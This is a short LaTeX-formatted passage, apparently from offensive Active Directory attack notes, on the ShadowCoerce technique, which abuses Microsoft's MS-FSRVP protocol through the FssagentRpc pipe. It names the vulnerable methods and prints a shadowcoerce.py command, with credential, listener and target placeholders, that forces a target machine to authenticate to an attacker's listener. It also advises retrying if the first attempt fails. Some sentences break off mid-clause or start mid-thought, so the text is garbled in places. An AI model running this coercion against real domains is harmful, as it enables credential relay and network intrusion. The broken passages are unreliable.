\section{ShadowCoerce (MS-FSRVP)}
MS-FSRVP is Microsoft's File Server Remote VSS Protocol. It's used for creating shadow copies of file shares on a remote computer, and for facilitating backup applications in performing application-consistent backup and restore of data on SMB2 shares.

That interface is available through the \verb+\pipe\FssagentRpc+ SMB named pipe.

 two methods were detected as vulnerable: \verb+IsPathSupported+ and \verb+IsPathShadowCopied+.

 The coerced authentications are made over SMB. Unlike other similar coercion methods (MS-RPRN printerbug, MS-EFSR petitpotam), I doubt MS-FSRVP abuse can be combined with

\begin{verbatim}
shadowcoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
\end{verbatim}




  the coercion needed to be attempted twice in order to work when the FssAgent hadn't been requested in a while. In short, run the command again if it doesn't work the first time.
